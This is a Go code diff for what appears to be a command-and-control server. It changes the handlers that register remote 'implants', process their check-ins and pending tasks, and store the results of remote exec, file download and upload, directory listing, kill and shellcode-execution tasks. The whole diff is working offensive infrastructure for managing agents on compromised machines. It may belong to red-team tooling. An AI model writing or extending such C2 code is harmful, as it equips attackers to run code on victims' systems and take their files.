@@ -17,8 +17,10 @@ import (
 // all message types and their corresponding functions can be called through the map below and the one in lib/serializable.go
 var messageTypeToFunc = map[int]func(*transport.Session, interface{}){
 	0: handleImplantRegister,
-	1: handleCheckin,
+	2: handleCheckin,
 	4: handleImplantErrorResp,
+	6: handleImplantKillResp,
+	8: handleImplantConfigResp,
 	//reserved for implant functionality
 	12: handleFileInfoResp,
 	14: handleLsResp,
@@ -48,7 +50,7 @@ func TcpHandler(conn net.Conn) {
 
 // Handles envelopes with messageType==0. This is the very first message an implant sends to the server.
 func handleImplantRegister(sess *transport.Session, data interface{}) {
-	implantRegister, ok := data.(*communication.ImplantRegister)
+	implantRegister, ok := data.(*communication.ImplantRegisterReq)
 	if !ok {
 		log.Printf("[ERROR] Received envelope with messageType=0 (ImplantRegister), but could not convert envelope data to ImplantRegister datastructure")
 		return
@@ -62,23 +64,48 @@ func handleImplantRegister(sess *transport.Session, data interface{}) {
 	dbEntry.Uid = implantRegister.UID
 	dbEntry.Gid = implantRegister.GID
 	dbEntry.Public_ip = sess.Connection.RemoteAddr().String()
-	dbEntry.Last_checkin = int(time.Now().Unix())
-	dbEntry.Os = ""   //TODO
-	dbEntry.Arch = "" //TODO
-	err := db.AddImplant(dbEntry)
-	if err != nil {
+	dbEntry.Last_checkin = time.Now().Unix()
+	dbEntry.Os = implantRegister.Os
+	dbEntry.Arch = implantRegister.Arch
+	dbEntry.Active = true
+
+	_, err := db.GetImplantInfo(dbEntry.Id) //before adding implant registry, check if it already exists (e.g. after re-launching implant)
+	if err == db.ErrNoResults {             //if it doesn't exist, add the implant
+		err = db.AddImplant(dbEntry)
+		if err != nil {
+			log.Printf("[ERROR] Could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
+			return
+		}
+		log.Printf("[INFO] Registered implant with ID: %s", implantRegister.ImplantId)
+	} else if err == nil { //if it does exist, change the active status of the implant to true
+		err = db.SetImplantStatus(dbEntry.Id, true)
+		if err != nil {
+			log.Printf("[ERROR] Could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
+			return
+		}
+		log.Printf("[INFO] Known implant with ID: %s tried to register, changing status of implant to active.", implantRegister.ImplantId)
+	} else { //unkown db error
 		log.Printf("[ERROR] Could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
 		return
 	}
-	log.Printf("[INFO] Registered implant with ID: %s", implantRegister.ImplantId)
+
+	//let the implant know we successfully registered it.
+	req := communication.ImplantRegisterResp{Success: true}
+	err = transport.SendEnvelopeToImplant(sess, 1, req)
+	if err != nil {
+		log.Printf("[ERROR] Could not send register confirmation to implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
+		return
+	}
+
+	log.Printf("[INFO] Letting implant with ID: %s know that register was successful.", implantRegister.ImplantId)
 }
 
-// Handles envelopes with messageType==1. Every x amount of time, an implant sends a check-in message which this function handles.
+// Handles envelopes with messageType==2. Every x amount of time, an implant sends a check-in message which this function handles.
 // the "data" variable is a string with the ID of an implant.
 func handleCheckin(sess *transport.Session, data interface{}) {
 	implantCheckin, ok := data.(*communication.ImplantCheckinReq)
 	if !ok {
-		log.Printf("[ERROR] Received envelope with messageType=1 (Checkin), but could not convert envelope data to Checkin datastructure")
+		log.Printf("[ERROR] Received envelope with messageType=2 (Checkin), but could not convert envelope data to Checkin datastructure")
 		return
 	}
 	err := db.UpdateLastCheckin(implantCheckin.ImplantId, int(time.Now().Unix()))
@@ -113,7 +140,7 @@ func handleCheckin(sess *transport.Session, data interface{}) {
 		req.TaskArguments[i] = []byte(pendingTasks[i].Task_data)
 	}
 
-	transport.SendEnvelopeToImplant(sess, 2, req)
+	transport.SendEnvelopeToImplant(sess, 3, req)
 }
 
 // Handles enveloped with messageType==4. The implant send this message when execution of a module fails.
@@ -130,6 +157,43 @@ func handleImplantErrorResp(sess *transport.Session, data interface{}) {
 	err = db.CompleteTask(implantErrorResp.TaskId, marshalledRes)
 	if err != nil {
 		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", implantErrorResp.TaskId, err.Error())
+	}
+}
+
+// Handles enveloped with messageType==6. The implant send this message when the server requests it to terminate.
+func handleImplantKillResp(sess *transport.Session, data interface{}) {
+	implantKillResp, ok := data.(*communication.ImplantKillResp)
+	if !ok {
+		log.Printf("[ERROR] Received envelope with messageType=6 (ImplantKillResp), but could not convert envelope data to ImplantKillResp datastructure")
+		return
+	}
+	marshalledResult, err := json.Marshal(implantKillResp)
+	if err != nil {
+		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", implantKillResp.TaskId, err.Error())
+	}
+	err = db.SetImplantStatus(implantKillResp.ImplantId, false)
+	if err != nil {
+		log.Printf("[ERROR] Unable to set status of implant with ID: %s to \"false\" Reason: %s", implantKillResp.ImplantId, err.Error())
+	}
+	err = db.CompleteTask(implantKillResp.TaskId, marshalledResult)
+	if err != nil {
+		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", implantKillResp.TaskId, err.Error())
+	}
+}
+
+func handleImplantConfigResp(sess *transport.Session, data interface{}) {
+	implantConfigResp, ok := data.(*communication.ImplantConfigResp)
+	if !ok {
+		log.Printf("[ERROR] Received envelope with messageType=8 (ImplantConfigResp), but could not convert envelope data to ImplantConfigResp datastructure")
+		return
+	}
+	marshalledResult, err := json.Marshal(implantConfigResp)
+	if err != nil {
+		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", implantConfigResp.TaskId, err.Error())
+	}
+	err = db.CompleteTask(implantConfigResp.TaskId, marshalledResult)
+	if err != nil {
+		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", implantConfigResp.TaskId, err.Error())
 	}
 }
 
@@ -152,6 +216,7 @@ func handleFileInfoResp(sess *transport.Session, data interface{}) {
 	}
 }
 
+// Handles envelopes with messageType==14. The implant sends this message when the server sends a ls request.
 func handleLsResp(sess *transport.Session, data interface{}) {
 	lsResp, ok := data.(*communication.LsResp)
 	if !ok {
@@ -168,6 +233,7 @@ func handleLsResp(sess *transport.Session, data interface{}) {
 	}
 }
 
+// Handles envelopes with messageType==16. The implant sends this message when the server sends an exec request.
 func handleExecResp(sess *transport.Session, data interface{}) {
 	execResp, ok := data.(*communication.ExecResp)
 	if !ok {
@@ -184,6 +250,7 @@ func handleExecResp(sess *transport.Session, data interface{}) {
 	}
 }
 
+// Handles envelopes with messageType==18. The implant sends this message when the server sends a cd request.
 func handleCdResp(sess *transport.Session, data interface{}) {
 	cdResp, ok := data.(*communication.CdResp)
 	if !ok {
@@ -200,6 +267,7 @@ func handleCdResp(sess *transport.Session, data interface{}) {
 	}
 }
 
+// Handles envelopes with messageType==20. The implant sends this message when the server sends a download request.
 func handleDownloadResp(sess *transport.Session, data interface{}) {
 	downloadResp, ok := data.(*communication.DownloadResp)
 	if !ok {
@@ -236,6 +304,7 @@ func handleDownloadResp(sess *transport.Session, data interface{}) {
 	}
 }
 
+// Handles envelopes with messageType==22. The implant sends this message when the server sends a upload request.
 func handleUploadResp(sess *transport.Session, data interface{}) {
 	uploadResp, ok := data.(*communication.UploadResp)
 	if !ok {
@@ -252,7 +321,19 @@ func handleUploadResp(sess *transport.Session, data interface{}) {
 	}
 }
 
-// TODO
+// Handles enveloped with messageType==24. The implant sends this message when the server sends a shellcode execute request.
 func handleShellcodeExecResp(sess *transport.Session, data interface{}) {
-
+	shellcodeExecResp, ok := data.(*communication.ShellcodeExecResp)
+	if !ok {
+		log.Printf("[ERROR] Received envelope with messageType=24 (ShellcodeExecResp), but could not convert envelope data to ShellcodeExecResp datastructure")
+		return
+	}
+	marshalledResult, err := json.Marshal(shellcodeExecResp)
+	if err != nil {
+		log.Printf("[ERROR] Unable to marshal result of task with ID: %s for storage in database. Reason: %s", shellcodeExecResp.TaskId, err.Error())
+	}
+	err = db.CompleteTask(shellcodeExecResp.TaskId, marshalledResult)
+	if err != nil {
+		log.Printf("[ERROR] Unable to store result of completed task with ID: %s. Reason: %s", shellcodeExecResp.TaskId, err.Error())
+	}
 }
